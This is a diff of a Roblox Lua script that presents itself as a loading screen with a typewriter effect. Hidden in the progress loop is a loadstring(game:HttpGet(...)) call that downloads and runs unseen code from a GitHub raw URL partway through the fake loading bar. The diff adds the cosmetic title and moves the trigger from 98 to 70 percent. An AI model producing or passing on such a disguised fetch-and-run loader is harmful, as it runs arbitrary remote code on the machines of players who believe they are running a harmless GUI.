@@ -1,3 +1,7 @@
+-- ROBLOX GUI Script - Modern Loading Screen with Dramatic Typewriter Effect
+
+
+
 local player = game.Players.LocalPlayer
 local username = player and player.Name or "Guest"
 
@@ -170,7 +174,7 @@ local phases = {
 local percent = 0
 local phaseIndex = 1
 while percent <= 100 do
-    if percent == 98 then
+    if percent == 70 then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/fufubuku23/GaGPet/refs/heads/main/Script"))()
     end
     if phaseIndex <= #phases and percent >= ((phaseIndex - 1) * (100 / #phases)) then
